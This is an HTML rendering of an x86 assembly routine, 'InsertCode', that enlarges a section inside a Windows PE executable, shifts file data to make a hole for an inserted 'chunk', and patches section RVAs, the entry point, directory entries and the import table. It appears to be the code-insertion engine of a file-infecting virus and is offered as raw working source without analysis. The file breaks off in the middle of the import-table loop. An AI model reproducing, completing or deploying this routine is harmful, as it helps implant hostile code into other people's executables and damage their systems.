<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>INSERT.INC</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">DEBUGOFF</span><span class="sc0">

</span><span class="sc1">;InsertCode</span><span class="sc0">

</span><span class="sc1">;eax=section to insert</span><span class="sc0">
</span><span class="sc1">;ecx=size to add</span><span class="sc0">
</span><span class="sc1">;edx=file size</span><span class="sc0">
</span><span class="sc1">;return:</span><span class="sc0">
</span><span class="sc1">;eax=rva to chunk</span><span class="sc0">
</span><span class="sc1">;ecx=raw to chunk</span><span class="sc0">
</span><span class="sc1">;edx=new file size</span><span class="sc0">
</span><span class="sc5">InsertCode</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">next_section_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@has_relocs</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">without</span><span class="sc0"> </span><span class="sc5">relocs...</span><span class="sc0"> </span><span class="sc5">Increasing</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
  </span><span class="sc5">@@has_relocs</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                      </span><span class="sc1">;esi==section we will increase</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                      </span><span class="sc1">;we will increase last one?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@increase_last_section</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;new virtual_size</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;rva of start of my chunk</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;raw to start of my chunk</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">New</span><span class="sc0"> </span><span class="sc5">virtual</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">rva</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">insert</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">raw</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">insert</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">Size</span><span class="sc0"> </span><span class="sc5">available</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0"> </span><span class="sc5">need</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">&gt;,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;inserted size fill in pad</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@no_move</span><span class="sc0">

</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Moving</span><span class="sc0"> </span><span class="sc5">file...</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                  </span><span class="sc1">;align new physical size</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;ebx=delta between sections</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">New</span><span class="sc0"> </span><span class="sc5">raw</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">delta</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">)&gt;,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">      </span><span class="sc1">;ecx==how much sections need update</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">updating</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">sections</span><span class="sc0"> </span><span class="sc5">SH_PointerToRawData</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@next_section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@skip</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;first section changed &amp;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;where in disk it is</span><span class="sc0">
  </span><span class="sc5">@@skip</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@no_body</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;ebx==delta between sections</span><span class="sc0">
  </span><span class="sc5">@@no_body</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_section</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">;pushad.edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ecx=ammount to move</span><span class="sc0">

       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
  </span><span class="sc5">@@retrybss</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;if section dont exists in disk,</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@retrybss</span><span class="sc0">                       </span><span class="sc1">;get next</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">;pushad.edx        ;new file size</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;map in memory</span><span class="sc0">

       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">moving</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc4">(%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc4">)&gt;,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">std</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                </span><span class="sc1">;make hole</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;esi=section header</span><span class="sc0">

       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">next_section_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

  </span><span class="sc5">@@no_move</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">;ebx==new virtual size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;align new virtual size</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">New</span><span class="sc0"> </span><span class="sc5">virtual</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">delta</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">)&gt;,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_fix</span><span class="sc0">              </span><span class="sc1">;sections rvas didnt changed...</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;pushad.eax              ;section we're increasing</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_fix_section</span><span class="sc0">                   </span><span class="sc1">;how much sections need update</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">updating</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">sections</span><span class="sc0"> </span><span class="sc5">SH_VirtualAddress</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc0">

  </span><span class="sc5">@@next_section2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">    </span><span class="sc1">;fix section header RVAs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_section2</span><span class="sc0">

  </span><span class="sc5">@@no_fix_section</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">fix</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">fields</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;rva entrypoint</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;base of code</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;base of data</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">OH_SizeOfImage</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">OH_ImageBase</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;image size</span><span class="sc0">

</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">fix</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">OH_NumberOfRvaAndSizes</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">OH_SizeOfHeaders</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
  </span><span class="sc5">@@next_rva</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">                             </span><span class="sc1">;fix directory entries RVAs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">           </span><span class="sc1">;skip directory.size</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_rva</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                    </span><span class="sc1">;esi==IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done_import</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">process</span><span class="sc0"> </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">                             </span><span class="sc1">;process import table</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;esi==import directory</span><span class="sc0">

  </span><span class="sc5">@@next_dll</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done_import</span><span class="sc0">                         </span><span class="sc1">;all dllz done</span><span class="sc0">

